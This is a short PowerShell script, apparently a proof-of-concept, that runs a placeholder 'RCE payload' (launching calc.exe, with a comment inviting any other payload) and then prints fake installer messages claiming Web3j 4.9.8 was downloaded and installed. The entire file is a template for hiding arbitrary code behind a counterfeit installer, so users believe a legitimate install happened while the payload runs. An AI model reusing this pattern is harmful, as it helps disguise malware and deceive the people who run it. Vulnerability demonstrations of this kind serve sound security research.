Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# RCE payload
Start-Process "calc.exe"  # Replace with any other payload

# Fake legit installer output
Write-Output "Downloading Web3j version 4.9.8..."
Start-Sleep -Seconds 2
Write-Output "Extracting Web3j..."
Start-Sleep -Seconds 2
Write-Output "Web3j has been successfully installed (assuming errors were printed to your console)."
